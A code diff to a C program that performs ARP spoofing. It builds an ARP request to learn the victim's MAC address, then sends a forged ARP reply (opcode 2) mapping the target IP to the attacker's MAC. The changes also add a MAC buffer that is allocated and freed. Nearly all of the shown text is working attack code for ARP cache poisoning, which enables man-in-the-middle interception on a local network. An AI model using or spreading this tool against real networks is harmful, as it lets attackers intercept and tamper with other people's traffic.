@@ -33,28 +33,26 @@ int main(int argc, const char* argv[]){
 	printf("attacker mac : ");
 	print_mac(attacker_mac);
 
-	//Get sender mac
-	//set request arp (opcode 1)
+	//malloc return mac
+	unsigned char* ret_mac;
+	ret_mac = (unsigned char *)malloc(6*sizeof(unsigned char));
+	
+	//set arp request
 	packet_data=set_eth_arp(&eth,&arp_req,NULL,attacker_mac,sender_ip,attacker_ip_str,1);
 	//send arp_req packet with sender ip
-	sender_mac=send_packet(packet_data,sender_ip,interface,header,1);
+	sender_mac=send_packet(packet_data,ret_mac,sender_ip,interface,header,1);
 	printf("sender mac : ");
 	print_mac(sender_mac);
 
-	//Get target mac
-	//set request arp (opcode 1)
-	packet_data=set_eth_arp(&eth,&arp_req,NULL,attacker_mac,target_ip,attacker_ip_str,1);
-	//send arp_req packet with target_ip
-	target_mac=send_packet(packet_data,target_ip,interface,header,1);
-	printf("target mac : ");
-	print_mac(target_mac);
-
 	//&fake arp reply
-	//set reply arp (opcode 0)
-	packet_data=set_eth_arp(&fake_eth,&fake_arp,sender_mac,attacker_mac,sender_ip,target_ip,0);
-	send_packet(packet_data,NULL,interface,header,0);
+	//set reply arp (opcode 2)
+	packet_data=set_eth_arp(&fake_eth,&fake_arp,sender_mac,attacker_mac,sender_ip,target_ip,2);
+	unsigned char* empty_mac;
+	empty_mac=send_packet(packet_data,ret_mac,NULL,interface,header,0);
 	
 	//close socket
 	close(s);
+	//free ret_mac
+	free(ret_mac);
 	return 0;
 }
